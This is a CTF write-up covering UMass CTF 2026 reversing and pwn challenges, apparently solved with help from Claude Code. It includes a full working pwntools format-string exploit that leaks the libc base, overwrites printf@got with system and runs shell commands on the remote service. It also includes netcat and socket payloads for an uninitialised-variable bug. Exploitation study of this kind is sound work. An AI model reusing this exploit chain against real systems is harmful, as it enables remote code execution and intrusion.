# UMASS CTF 2026 

In the UMASS CTF, [Bryan Bidleman](https://github.com/bbidleman) and I focused on the software reverse engineering and binary exploitation challenges.

Below are the step-by-step processes to obtaining a flag for each challenge we managed to solve for ; which was assisted too with Claude Code.

This pushes toward the interesting question raised, how much precedence will solutions like Claude Code aide Vulnerability Researchers.

<img width="1479" height="423" alt="image" src="https://github.com/user-attachments/assets/f2dd5088-98a5-4fce-9d5c-4798bc1e90cc" />

---
# SRE: Batcave Bitflips

**Goal:** Find an input that the binary accepts as a valid license key, and recover the flag it decrypts on success.

Checking the file type, running it, and viewing checksec:
```bash
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Reversing/One]
└─# file batcave_license_checker                           
batcave_license_checker: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8f2242bd67c2413d4326d407e9bdd662490fc983, for GNU/Linux 3.2.0, not stripped
                                                                                                                             
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Reversing/One]
└─# ./batcave_license_checker 
=================================================================================
_-_-_-_-_-_-_-_-_-_-_- BATCAVE LICENSE VERIFICATION (Beta) _-_-_-_-_-_-_-_-_-_-_-
=================================================================================

ENTER LICENSE KEY: 
COMPUTING...
HASHED KEY: 52c33381a302f090215192516871eba243694342e098e9f3d069333163c3e07a
VERIFYING...
INVALID LICENSE - PLEASE CONTACT ALFRED
                                                                                                                             
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Reversing/One]
└─# checksec batcave_license_checker 
[*] '/home/kali/Downloads/Umass-CTF/Reversing/One/batcave_license_checker'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

##### Static Analysis with Ghidra

Inside of Ghidra where the binary is not stripped we can see a symbol tree. Our approach is to start from the main function and work outward.

<img width="869" height="723" alt="image" src="https://github.com/user-attachments/assets/af91354a-e318-40f9-9c08-c253050b963a" />

Decompiled main:
```c
int main(void) {
    char input[33];     // stack buffer for user input
    char state[32];     // output of hash()
    FILE *in;

    puts("========================");
    puts("BATCAVE LICENSE ...");
    puts("========================");

    in = fdopen(0, "r");                     // stdin
    printf("ENTER LICENSE KEY: ");
    fgets(input, 0x21, in);                   // up to 32 chars + NUL
    input[32] = 0;

    puts("COMPUTING...");
    hash(input, state);                         // <-- custom hash

    char *hex = bytes_to_hex(state, 32);
    printf("HASHED KEY: %s\n", hex);
    free(hex);

    puts("VERIFYING...");
    if (verify(state) == 0) {                  // memcmp against EXPECTED
        puts("LICENSE BAD");
        exit(1);
    }
    puts("LICENSE GOOD - DECRYPTING BAT DATA...");
    decrypt_flag(state);                        // transforms FLAG[] in .data
    printf("FLAG: %s\n", FLAG);
    return 0;
}
```

Inside of the main function we can see the following interesting ones:
- hash()
- verify()
- decrypt_flag()

The decompiled hash function:

<img width="856" height="799" alt="image" src="https://github.com/user-attachments/assets/7b55b206-8015-4c02-b97e-ca25ed149bf2" />

The comparison of `local_5c < 0xBEEEF` = 782,063 (decimal) - that is huge.

This has a conditional statement to do over 12 million rounds of SBOX substitution, cross-mixing, and bit-rotation. This is an unkeyed, intentionally expensive, one-way hash. You are not going to algebraically invert this - and you do not need to. Always ask "do I really need to break this, or can I side-step it?".

The decompiled verify function:

<img width="871" height="224" alt="image" src="https://github.com/user-attachments/assets/bd6960b8-bcd0-4509-a96d-be051080fe9a" />

Comparison is against EXPECTED, a 32-byte constant stored in `.data` at virtual address 0x4040.

The decompiled decrypt flag function:

<img width="724" height="275" alt="image" src="https://github.com/user-attachments/assets/1d1433e8-4310-4de2-b030-85244bbfe53f" />

In Ghidra's listing view, double click the `FLAG` label to see the raw encrypted flag bytes in `.data` at `0x4060`. Do the same for `EXPECTED` at `0x4040`.


We have seen the virtual memory addresses such as `0x4060` and `0x4040` so when we run `objdump` on the binary we can acquire the constants for `EXPECTED` and `FLAG` (encrypted):
```python
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Reversing/One]
└─# objdump -s -j .data batcave_license_checker | head -n 40

batcave_license_checker:     file format elf64-x86-64

Contents of section .data:
4040 3b54751a 2406af05 778047c5 e483d348  ;Tu.$...w.G....H
4050 cb8730de 1a9145ab 15c79b22 04022bee  ..0...E...."..+.
4060 6e193449 777df05a 07b433a6 8ce6e617  n.4Iw}.Z..3.....
4070 fbe96fae 2ee526c3 70e3c47d 277f2b00  ..o...&.p..}'.+.
4080 cf6efe35 461aad58 78757354 8494ff70  .n.5F..XxusT...p

```

Because the same `state` buffer is passed to both `verify` and `decrypt_flag`, and `verify` only lets execution through if `state == EXPECTED`, we know what value `decrypt_flag` will be called with - `EXPECTED` itself.

That means we do not have to invert the 12M-round hash. We can just compute FLAG XOR EXPECTED ourselves.

Opening Python and testing with the values from where the values are allows us to get the flag:
```bash
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Reversing/One]
└─# python
Python 3.13.11 (main, Dec  8 2025, 11:43:54) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> FLAG = bytes.fromhex("6e193449777df05a07b433a68ce6e617" "fbe96fae2ee526c370e3c47d277f2b00")
>>> EXPECTED = bytes.fromhex("3b54751a2406af05778047c5e483d348" "cb8730de1a9145ab15c79b2204022bee")
>>> bytes(a^b for a,b in zip(FLAG, EXPECTED))
b'UMASS{__p4tche5_0n_p4tche$__#}\x00\xee'
```

XOR gives readable text, OR gives garbage. The binary itself actually uses OR. We can look at the raw bytes in GHIDRA or with `objdump`:

<img width="669" height="309" alt="image" src="https://github.com/user-attachments/assets/c6f52efa-c994-49da-ab12-17c8fa776bef" />


This instruction difference means that the binary even with a correct license key will always print mangled bytes forever.

##### Dynamic Analysis with GDB

The hash does 12.5 million rounds per-attempt. Brute forcing this is out of the question. We will run up to just before `verify`, then manually overwrite the `state` buffer with `EXPECTED`. `verify` then returns `success`, and execution falls into the `decrypt_flag` branch.

We can find the right breakpoint by running:
```bash
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Reversing/One]
└─# objdump -d batcave_license_checker | grep -A2 verify
000000000000166a <verify>:
    166a:	f3 0f 1e fa          	endbr64
    166e:	55                   	push   %rbp
--
    180b:	e8 5a fe ff ff       	call   166a <verify>
    1810:	85 c0                	test   %eax,%eax
    1812:	75 19                	jne    182d <main+0x18e>
```

The location we want is absolute in the ELF file at offset `0x180b`. 

We can compute the offset from `main`:
```bash
0x180b - 0x169f = 0x16c   # main starts at 0x169f
```

The caveat - because the binary is pie executable, you cannot set a breakpoint at `*0x180b` before the program is loaded - GDB has no idea where that maps in memory.

Either we:
1. Use `start` first (which runs until `main` stops), then set the breakpoint using a symbol-relative expression like `*(main+0x16c)`.
2. Or set a pending breakpoint on the symbol `verify` itself.

We can create a GDB script that can be run with the following command:
```bash
gdb -batch -x /tmp/solve.gdb
```

We can make the script executable too with the following instructions. Other things to note:
- Turning pagination off prevents GDB from pausing output.
- Turning disable-randomization on ensures addresses like `main+0x16c` stay stable.

Now we can run this with the suggested method above, keep in mind, if you're using GEF then it automatically turns on disable address randomization:
```bash
set pagination off
file ./batcave_license_checker2

# 1. Launch and stop at main. This maps the binary so main+offset works.
start < <(printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n")

# 2. Break at the `call verify` instruction inside main.
#    At this point: rbp-0x50 is the 32-byte `state` buffer (1st arg to verify).
break *(main+0x16c)
continue

# 3. Overwrite the state buffer with EXPECTED (from .data @ 0x4040).
#    verify() will now memcmp state==EXPECTED and return 1.
set {char[32]} ($rbp-0x50) = "\x3b\x54\x75\x1a\x24\x06\xaf\x05\x77\x80\x47\xc5\xe4\x83\xd3\x48\xcb\x87\x30\xde\x1a\x91\x45\xab\x15\xc7\x9b\x22\x04\x02\x2b\xee"

# 4. Let it run to completion — decrypt_flag() gets called with our fake state.
continue
quit
```

Prior to really running this to make it succeed requires patching the binary where the OR becomes a XOR, otherwise, we get garbage values due to the OR bug we looked at earlier.

<img width="875" height="398" alt="image" src="https://github.com/user-attachments/assets/fc6efe2a-34a7-4b9f-b345-a06e16e74e82" />

See the contents of the run for the flag, another solution:

<img width="810" height="159" alt="image" src="https://github.com/user-attachments/assets/6e65bc49-fbd8-41b5-a1ee-00ed39b18859" />

----
# SRE: Lego Clicker

----
# BINARY: Brick City Office Space

Enumerating the context of the binary:
```bash
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/One]
└─# file BrickCityOfficeSpace 
BrickCityOfficeSpace: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=bbba1b5cfa9ca1c5c04034cdc25f2c9f610d0036, for GNU/Linux 3.2.0, not stripped
                                                                                                                                            
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/One]
└─# checksec BrickCityOfficeSpace 
[*] '/home/kali/Downloads/Umass-CTF/Binary_Exploit/One/BrickCityOfficeSpace'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

Viewing all of the function names in `objdump`:
```bash
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/One]
└─# objdump -d BrickCityOfficeSpace -M intel | grep -E "<.*>:" 
08049000 <_init>:
08049030 <__libc_start_main@plt-0x10>:
08049040 <__libc_start_main@plt>:
08049050 <printf@plt>:
08049060 <fgets@plt>:
08049070 <fwrite@plt>:
08049080 <puts@plt>:
08049090 <exit@plt>:
080490a0 <strlen@plt>:
080490b0 <setvbuf@plt>:
080490c0 <_start>:
08049100 <_dl_relocate_static_pie>:
08049110 <__x86.get_pc_thunk.bx>:
08049120 <deregister_tm_clones>:
08049160 <register_tm_clones>:
080491a0 <__do_global_dtors_aux>:
080491d0 <frame_dummy>:
080491d6 <vuln>:
080493db <main>:
08049480 <_fini>:
```

The decompiled pseudocode of the main function:

<img width="873" height="439" alt="image" src="https://github.com/user-attachments/assets/f56821ae-098b-4b6f-9f55-1fcb9f8b11c8" />

The decompiled pseudocode of the vuln function: 

<img width="869" height="945" alt="image" src="https://github.com/user-attachments/assets/0df41d60-269e-4fc4-967d-3c812fc51813" />

Claude-assisted pseudocode:
```c
// Ghidra-decompiled pseudocode of vuln() — slightly cleaned up
void vuln(void) {
    char buf[0x250];                    // 592 bytes, at ebp-0x268
loop:
    puts(banner_line_1);
    puts(banner_line_2);
    puts(banner_line_3);
    puts(banner_line_4);
    puts("Now it's your turn to design...");
    puts("Note: use ` inplace of newlines.");
    fwrite("BrickCityOfficeSpace> ", 22, 1, stdout);

    fgets(buf, 0x250, stdin);        // reads up to 592 bytes

    for (i = 0; i < strlen(buf); i++) // replace ` with \n
        if (buf[i] == '`') buf[i] = '\n';

    puts(top_art);
    printf(buf);                       // <-- FORMAT STRING BUG
    puts(bottom_art);

    puts("Would you like to redesign? (y/n)");
    fgets(buf, 0x250, stdin);
    switch (buf[0]) {
        case 'y': case 'Y': goto loop;   // keep exploiting
        case 'n': case 'N': return;        // clean return
        default: puts(err); printf(buf); exit(0);
    }
}
```

The line `printf(buf)` passes attacker-controlled data as the format string. This is a textbook format string vulnerability.

We're able to read arbitrary stack memory with `%p`, `%x`, and `%s`.

Writing to arbitrary memory with `%n` (number of bytes printed so far).

Combined with the loop (we can answer y and retry), we get multiple format string primitive uses, which is more than enough to leak and write in separate passes. 

##### Finding The Format String Offset

When `printf` is called with our buffer as format string, its numbered arguments (`%1$`, `%2$`, ...) come from the stack above it. Somewhere in that sequence, our own buffer bytes become an "argument". We need to find that position.

```python
# Technique: send a marker, then %p repeatedly, and see where it appears
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/One]
└─# python3 -c "print('AAAA.' + '.'.join(f'%{i}\$p' for i in range(1,8)))" > /tmp/fs.txt
                                                                                                                                            
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/One]
└─# echo n >> /tmp/fs.txt 
                                                                                                                                            
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/One]
└─# ./BrickCityOfficeSpace < /tmp/fs.txt | grep AAAA
AAAA.0x250.0xf7f575c0.0xf7f57d40.0x41414141.0x2431252e.0x32252e70.0x252e7024
```

Position	Value	Meaning
%1$p	0x250	fgets size arg leftover on the stack
%2$p	0xf7eff5c0	libc pointer (we'll use this!)
%3$p	0xf7effd40	another libc pointer
%4$p	0x41414141	our AAAA — offset is 4

What "offset 4" means: if we place a target address as the first 4 bytes of our buffer, then %4$n will write the number of characters printed so far to that address. That's the core primitive for arbitrary writes. 

##### Leaking LibC Base

Positions 2 and 3 are already libc pointers sitting on the stack - almost certainly the libc-internal FILE pointers used by `fgets`. We just need to identify which libc symbol they correspond to so we can subtract to get the base.

```bash
# Check low 12 bits against libc.so.6 symbols — page-aligned bases mean
# the low 12 bits of (address - base) must match a symbol's offset.
from pwn import ELF
libc = ELF('./libc.so.6')
leak = 0xf7eff5c0
for name, off in libc.symbols.items():
    if (leak - off) & 0xFFF == 0:
        print(name, hex(leak - off))

# Best match:
#   _IO_2_1_stdin_  -> libc_base = 0xf7cd0000
#   _IO_2_1_stdout_ -> libc_base = 0xf7cd0000    (same base — confirms match)
```

Both leaks resolve to the same base address, which cross-validates our guess. From here:
```bash
libc.address          = stdin_leak - libc.symbols['_IO_2_1_stdin_']
system_addr           = libc.address + libc.symbols['system']      # 0x48170
bin_sh_addr           = libc.address + next(libc.search(b'/bin/sh\x00'))
```

##### Global Offset Table (GOT) Overwrite Strategy

We have format-string write primitive (`%n` at offset 4) and we know libc's `system` address. With No RELRO, `printf@got` is writable. The plan:
```text
BEFORE                                AFTER
┌─────────────────┐                 ┌─────────────────┐
│ printf@plt      │──────jmp────▶  │ printf@plt      │──────jmp────┐
│ jmp *[printf@got] │                │ jmp *[printf@got] │              │
└─────────────────┘                 └─────────────────┘              │
                                                                     ▼
┌─────────────────┐                 ┌─────────────────┐      ┌──────────┐
│ printf@got      │                 │ printf@got      │────▶│  system  │
│ → libc:printf   │                 │ → libc:system   │      │  (libc)  │
└─────────────────┘                 └─────────────────┘      └──────────┘
```

After the overwrite, every future call to `printf@plt` in the binary actually jumps to `system` instead. Look at this line in `vuln()`:
```c
printf(buf);        // we reach this every loop iteration
```

With `printf@got == system`, that line is equivalent to `system(buf)` on the next pass. And since `buf` is still under our control from the next `fgets`, we just provide a shell command as our ASCII art

**Why this works on i386:** Both printf and system take their first argument on the stack at [esp+4]. When the compiler emits printf(buf), it pushes buf and does call printf@plt. The PLT trampolines through the GOT, and whatever function we pointed it at sees buf as its first argument. So printf(buf) seamlessly becomes system(buf). 

##### Performing The Write with `fmtstr_payload`

Computing the exact `%n`-write payload by hand is tedious (you have to carefully track the running character count and choose `%hn` vs `%n`, order your writes, etc.). Pwntools can do all of that for us:
```python
from pwn import *
elf  = ELF('./BrickCityOfficeSpace')
libc = ELF('./libc.so.6')
libc.address = 0xf7cd0000              # from leak

payload = fmtstr_payload(
    offset      = 4,                      # where our buffer lives in printf args
    writes      = {elf.got['printf']: libc.symbols['system']},
    write_size  = 'short',                # use %hn (2-byte writes)
)
print(len(payload))                    # -> 36 bytes, well under 0x250
```

**Payload length matters:**
- `fmtstr_payload` can balloon (you need to pad the running count up to specific values using `%Nc`). `write_size='short'` means we do two separate 2-byte writes instead of one 4-byte write, which keeps the maximum padding small. Sanity-check with `assert len(payload) < 0x250`.

**Be aware of the backtick replacement:**
- Before `printf` is called, the loop in `vuln` replaces every tick (`0x60`) byte with `\n`. Always assert that your payload doesn't contain `0x60`; if it does, re-run with different parameters until you get a clean payload.

##### Popping a shell - loop by loop

**The full attack is three passes through the y → redesign loop:**
Loop	Payload	Effect
1 	LEAK:%2$p 	Prints _IO_2_1_stdin_ address; we subtract to get libc base. Answer y.
2 	fmtstr_payload(4, {got['printf']: system}) 	%n writes system's address over printf@got. Answer y.
3 	cat flag.txt; ls; id 	printf(buf) is now system(buf) — the command runs, flag is dumped to the socket. 

##### The `interactive()` stalls on the remote

A natural choice for loop 3 is to send `/bin/sh` and call `io.interactive()` and this works perfectly locally. On the remote it silently hangs.

The cause:
- `system("/bin/sh\n")` calls `execvp("sh", ["sh","-c","/bin/sh\n"])`, which execs a fresh `sh`.
- That inner shell is attached to the service's socket, not a TTY. Without a TTY, `sh` uses full `stdio` buffering rather than line buffering. Output of commands you type accumulates in a buffer and is only flushed when the shell exits - so it looks dead.
- Some remotes also have no echo, so you don't even see your own typing.

The fix:
- Skip the interactive shell and run commands non-interactively in one shot. When `system()` is called with a single command string, it spawns `sh -c "cmd"`, executes the command, waits for completion, and then the whole thing flushes before returning. Output comes back cleanly.

##### Full Exploit Script Ran Locally

**The script:**
```python
#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF('./BrickCityOfficeSpace')
context.log_level = 'info'
libc = ELF('./libc.so.6')

HOST, PORT = 'brick-city-office-space.pwn.ctf.umasscybersec.org', 45001

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(['./ld-linux.so.2', '--library-path', '.', exe.path],
                         gdbscript='c')
    return process(['./ld-linux.so.2', '--library-path', '.', exe.path])

io = start()

# --- Loop 1: leak libc base via stack-resident _IO_2_1_stdin_ pointer ---
io.recvuntil(b'BrickCityOfficeSpace> ')
io.sendline(b'LEAK:%2$p')
io.recvuntil(b'LEAK:')
stdin_addr = int(io.recvline().strip(), 16)
libc.address = stdin_addr - libc.symbols['_IO_2_1_stdin_']
log.success(f'libc base: {hex(libc.address)}')

io.recvuntil(b'redesign? (y/n)')
io.sendline(b'y')

# --- Loop 2: %n-write printf@got => system ---
payload = fmtstr_payload(4,
                          {exe.got['printf']: libc.symbols['system']},
                          write_size='short')
assert len(payload) < 0x250
assert b'`' not in payload

io.recvuntil(b'BrickCityOfficeSpace> ')
io.sendline(payload)
io.recvuntil(b'redesign? (y/n)')
io.sendline(b'y')

# --- Loop 3: printf(buf) -> system(buf), dump the flag ---
cmd = (b'echo ===FLAG===; cat flag.txt; cat /flag.txt 2>/dev/null; '
       b'ls -la; id; echo ===END===')
io.recvuntil(b'BrickCityOfficeSpace> ')
io.sendline(cmd)

io.recvuntil(b'===FLAG===\n')
dump = io.recvuntil(b'===END===', drop=True)
log.success('command output:\n' + dump.decode())
```

**Output:**
```bash
──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/One]
└─# ./exploit2.py 
[*] '/home/kali/Downloads/Umass-CTF/Binary_Exploit/One/BrickCityOfficeSpace'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[*] '/home/kali/Downloads/Umass-CTF/Binary_Exploit/One/libc.so.6'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Starting local process './ld-linux.so.2': pid 729937
[+] libc base: 0xf7cee000
[+] command output:
    UMASS{example_flag}
    total 3604
    drwxr-xr-x 2 root root    4096 Apr 13 21:37 .
    drwxr-xr-x 4 root root    4096 Apr 11 20:14 ..
    -rwxrwxrwx 1 root root   14004 Apr 10 17:06 BrickCityOfficeSpace
    -rw-rw-r-- 1 kali kali 1103686 Apr 11 20:12 brick-city-office-space.zip
    -rw-r--r-- 1 root root   29333 Apr 11 20:38 brickcity_solve.html
    -rwxr-xr-x 1 root root    1591 Apr 13 21:37 exploit2.py
    -rwxr-xr-x 1 root root    5032 Apr 11 20:32 exploit.py
    -rwxrwxrwx 1 root root      20 Apr 10 17:06 flag.txt
    -rwxrwxrwx 1 root root  225864 Jan 30 03:20 ld-linux.so.2
    -rwxrwxrwx 1 root root 2280756 Jan 30 03:20 libc.so.6
    uid=0(root) gid=0(root) groups=0(root)
[*] Stopped process './ld-linux.so.2' (pid 729937)
```

**The flag: UMASS{th3-f0rm4t_15-0ff-th3-ch4rt5}**

---
# BINARY: Brick Workshop

Enumerating the context of the binary:
```bash
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/Two]
└─# file bad_eraser              
bad_eraser: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b74b3556d83720300f4f2aa20803ba5345b5fb70, for GNU/Linux 3.2.0, not stripped
                                                                                                                                      
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/Two]
└─# checksec bad_eraser             
[*] '/home/kali/Downloads/Umass-CTF/Binary_Exploit/Two/bad_eraser'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
                                                                                                                                      
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/Two]
└─# cat Makefile       
all:
	gcc -O0 -fno-stack-protector -no-pie bad_eraser.c -o bad_eraser
```

We have the source to look at:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int service_initialized = 0;

void win(void) {
    FILE *fp;
    char flag_buf[128];

    puts("Master Builder status unlocked!");

    fp = fopen("flag.txt", "r");
    if (fp == NULL) {
        puts("flag.txt is missing. Ask an admin to deploy the real flag.");
        exit(1);
    }

    if (fgets(flag_buf, sizeof(flag_buf), fp) != NULL) {
        printf("%s", flag_buf);
    } else {
        puts("Failed to read flag.txt");
    }

    fclose(fp);
    exit(0);
}

static void banner(void) {
    puts("=== Bad Eraser Brick Workshop ===");
    puts("1) Preview a custom brick");
    puts("2) Use eraser tool");
    puts("3) Enter clutch-power diagnostics");
    puts("4) Close workshop");
    printf("> ");
}

static void preview_brick(void) {
    char model[48];

    printf("Model name: ");
    if (scanf("%47s", model) != 1) {
        exit(0);
    }
    printf("Built preview for %s with 8 studs.\n", model);
}

static void erase_station(void) {
    char note[96];

    printf("What should the eraser remove from your notes? ");
    if (scanf("%95s", note) != 1) {
        exit(0);
    }
    printf("Eraser scrubbed: %s\n", note);
}

static unsigned int clutch_score(unsigned int mold_id, unsigned int pigment_code) {
    return (((mold_id >> 2) & 0x43u) | pigment_code) + (pigment_code << 1);
}

static void diagnostics_bay(unsigned int mold_id, unsigned int pigment_code) {
    puts("Running clutch-power diagnostics...");
    if (clutch_score(mold_id, pigment_code) == 0x23ccdu) {
        win();
    }

    puts("Result: unstable clutch fit. Send batch back to sorting.");
    exit(0);
}

static void workshop_turn(void) {
    int choice;
    unsigned int mold_id;
    unsigned int pigment_code;

    banner();
    if (scanf("%d", &choice) != 1) {
        exit(0);
    }

    if (choice == 1) {
        preview_brick();
        return;
    }

    if (choice == 2) {
        erase_station();
        return;
    }

    if (choice == 4) {
        puts("Workshop closed. See you next build day.");
        exit(0);
    }

    if (choice != 3) {
        puts("Unknown action. Pick 1-4.");
        return;
    }

    if (!service_initialized) {
        puts("First-time calibration required.");
        puts("Enter mold id and pigment code.");
        if (scanf("%u %u", &mold_id, &pigment_code) != 2) {
            exit(0);
        }

        puts("Calibration saved. Re-enter diagnostics for clutch validation.");
        service_initialized = 1;
        return;
    }

    diagnostics_bay(mold_id, pigment_code);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    while (1) {
        workshop_turn();
    }

    return 0;
}
```

##### Source Code Analysis Notes:

On the first visit to choice 3, scanf fills mold_id and pigment_code on the stack, sets service_initialized = 1, and returns — it never calls diagnostics_bay.

On the second visit to choice 3, service_initialized is already 1, so the scanf is skipped entirely. The code falls straight through to diagnostics_bay(mold_id, pigment_code).

But mold_id and pigment_code are local variables — from the compiler's point of view they are uninitialized in this second call. The C standard says reading them is undefined behavior.

In practice (at -O0, on x86-64 Linux), they read whatever bytes happen to sit at those stack slots. And those bytes are exactly the values we wrote on the first visit, because nothing in between overwrites them. 

**The two functions of interest are:**
- clutch_score()
- diagnostics_bay()

See clutch score:
```c
static unsigned int clutch_score(unsigned int mold_id, unsigned int pigment_code) {
    return (((mold_id >> 2) & 0x43u) | pigment_code) + (pigment_code << 1);
}
```

See diagnostics bay:
```c
static void diagnostics_bay(unsigned int mold_id, unsigned int pigment_code) {
    puts("Running clutch-power diagnostics...");
    if (clutch_score(mold_id, pigment_code) == 0x23ccdu) {
        win();
    }
```

This is a classic CTF style gatekeeper function. The program prints a message, computes a score from the two inputs, and if that score equals `0x23ccd` you win.

The score we need to win is 146,637 in decimal converted from the score to win above.

##### LLM Suggestions to approach:

Now that you know the exact equation, you can:
- Solve for pigment_code given mold_id
- Solve for mold_id given pigment_code
- Brute‑force both (very easy, small search space)
- Patch the binary to bypass the check
- Use GDB to force the condition true
- Rewrite the function to print the required values

Ways to win:
1. Solving the equation algebraically.
2. Writing a brute-forcer.
3. Patching the binary so `win()` always runs.
4. Reversing the bitmask to understand which `mold_id` bits matter.
#### The Math Approach

Making the first term collapse:
```c
// With m = 0:
((0 & 0x43) | p) + 2p
= p + 2p
= 3p

// Solve: 3p = 0x23CCD
p = 0x23CCD / 3
p = 0xBEEF // = 48879 in decimal

// Verify 3 x 0xBEEF = 0x23CCD
```

Providing the right numbers locally to test:
```bash
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/Two]
└─# ./bad_eraser
=== Bad Eraser Brick Workshop ===
1) Preview a custom brick
2) Use eraser tool
3) Enter clutch-power diagnostics
4) Close workshop
> 3
First-time calibration required.
Enter mold id and pigment code.
0
48879
Calibration saved. Re-enter diagnostics for clutch validation.
=== Bad Eraser Brick Workshop ===
5) Preview a custom brick
6) Use eraser tool
7) Enter clutch-power diagnostics
8) Close workshop
> 3
Running clutch-power diagnostics...
Master Builder status unlocked!
flag{test_local}
```

Sending the payload over Netcat with newlines to separate input values for a one-liner:
```bash
┌──(root㉿kali)-[/home/…/Downloads/Umass-CTF/Binary_Exploit/Two]
└─#  printf '3\n0 48879\n3\n' | nc bad-eraser-brick-workshop.pwn.ctf.umasscybersec.org 45002
=== Bad Eraser Brick Workshop ===
1) Preview a custom brick
2) Use eraser tool
3) Enter clutch-power diagnostics
4) Close workshop
> First-time calibration required.
Enter mold id and pigment code.
Calibration saved. Re-enter diagnostics for clutch validation.
=== Bad Eraser Brick Workshop ===
5) Preview a custom brick
6) Use eraser tool
7) Enter clutch-power diagnostics
8) Close workshop
> Running clutch-power diagnostics...
Master Builder status unlocked!
UMASS{brickshop_calibration_reuses_your_last_batch} 
```

This was really cool to me - got to see a way to separate data sending over netcat.

Here is another way of sending the payload in the terminal with Python:
```python
python3 -c "
import socket, time

s = socket.socket()
s.connect(('bad-eraser-brick-workshop.pwn.ctf.umasscybersec.org', 45002))
s.settimeout(3)

def recv():
    data = b''
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
    except: pass
    return data.decode()

print(recv())          # banner
s.sendall(b'3\n')      # option 3 first time
print(recv())
s.sendall(b'0 48879\n') # mold_id=0, pigment_code=0xbeef
print(recv())
s.sendall(b'3\n')      # option 3 second time - triggers win()
print(recv())
s.close()
"
```

----
# BINARY: Factory Monitor

